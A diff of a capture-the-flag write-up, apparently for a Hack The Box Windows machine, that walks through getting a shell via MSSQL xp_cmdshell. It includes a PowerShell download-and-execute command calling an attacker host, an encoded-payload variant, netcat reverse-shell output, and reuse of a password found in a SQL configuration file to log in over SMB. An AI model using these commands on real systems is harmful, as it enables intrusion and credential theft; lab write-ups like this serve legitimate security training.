@@ -213,14 +213,7 @@ And in the `MSSQL` session invoke the web request like so.
     1> exec xp_cmdshell 'powershell -c "iex (new-object net.webclient).downloadstring(\"http://10.10.14.xxx:58008/shell.ps1\")"'
     2> go 
 
-You'll see it make a request to your web server, then you'll see a connection from netcat. 
-
-    Listening on 0.0.0.0 42069
-    Connection received on 10.10.11.51 50293
-    <hit enter>
-    PS C:\Windows\system32> 
-
-Or... If you don't want to set up a web server, you can base64 encode the payload and pipe 
+_OR..._ If you don't want to set up a web server, you can base64 encode the payload and pipe 
 it directly into the `xp_cmdshell`. 
 
 Just ensure you're encoding with the correct format for Windows. Windows uses UTF-16LE. To
@@ -232,3 +225,68 @@ Take the output from that and paste it into the `MSSQL` client prompt.
 
     1> exec xp_cmdshell 'powershell -e <base64>'
     2> go
+
+You'll see it make a request to your web server, then you'll see a connection from netcat. 
+
+    Listening on 0.0.0.0 42069
+    Connection received on 10.10.11.51 50293
+    <hit enter>
+    PS C:\Windows\system32> 
+
+## On The Box
+
+Once you have a prompt, you can look around at the system files. To save us some time
+let us focus on things we most likely have access to as the `sql_svc` user. 
+
+Looking at the root folder, we see MSSQL2019 has been installed at that location. That 
+seems like a good folder to check.
+
+    Mode                LastWriteTime         Length Name
+    ----                -------------         ------ ----
+    d-----         6/8/2024   3:07 PM                1033_ENU_LP
+    d-----         6/8/2024   3:07 PM                redist
+    d-----         6/8/2024   3:07 PM                resources
+    d-----         6/8/2024   3:07 PM                x64
+    -a----        9/24/2019  10:03 PM             45 AUTORUN.INF
+    -a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML
+    -a----         6/8/2024   3:07 PM             16 PackageId.dat
+    -a----        9/24/2019  10:03 PM         142944 SETUP.EXE
+    -a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG
+    -a----         6/8/2024   3:07 PM            717 sql-Configuration.INI
+    -a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL
+
+
+    PS C:\SQL2019\ExpressAdv_ENU> 
+
+That `sql-Configuration.INI` contains the passwords needed to authenticate with the sql 
+server. 
+
+That's great. We can try to authenticate with the `sql_svc` user. It shows in the file 
+that this account is linked to that password. 
+
+Hmm. Neither `sql_svc` nor `Administrator` worked. 
+
+Let's see which users exist on this system. 
+
+    Mode                LastWriteTime         Length Name
+    ----                -------------         ------ ----
+    d-----       12/25/2024   3:10 AM                Administrator
+    d-r---         3/7/2025   6:59 AM                Public
+    d-----         6/9/2024   4:15 AM                ryan
+    d-----         6/8/2024   4:16 PM                sql_svc
+
+
+    PS C:\users> 
+
+Okay... Let's try this password with `ryan` then? 
+
+    smbclient -U ryan //DC01.sequel.htb/Users
+    Password for [WORKGROUP\ryan]: <enter password>
+
+Awesome! We can log in! 
+
+![user.txt](/static/media/ctf/htb-escapetwo-user.png)
+
+Noticing a new `ryan` folder in the share, we can find the `user.txt`
+
+TO BE CONTINUED...
